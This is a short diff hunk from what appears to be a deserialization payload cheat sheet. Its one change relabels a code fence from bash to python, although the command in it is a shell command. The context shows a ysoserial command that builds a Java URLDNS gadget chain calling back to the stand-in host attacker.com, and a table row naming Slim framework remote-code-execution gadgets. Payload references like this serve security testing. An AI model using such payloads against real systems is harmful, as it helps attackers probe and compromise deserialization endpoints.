@@ -1811,7 +1811,7 @@ echo "Slim/RCE1-2 | Slim framework | system/exec"
 
 ### Universal Detection Payloads
 
-```bash
+```python
 # Java URLDNS chain (safe, no RCE, DNS callback only)
 java -jar ysoserial.jar URLDNS 'http://attacker.com/java-detect' | base64 -w0
 
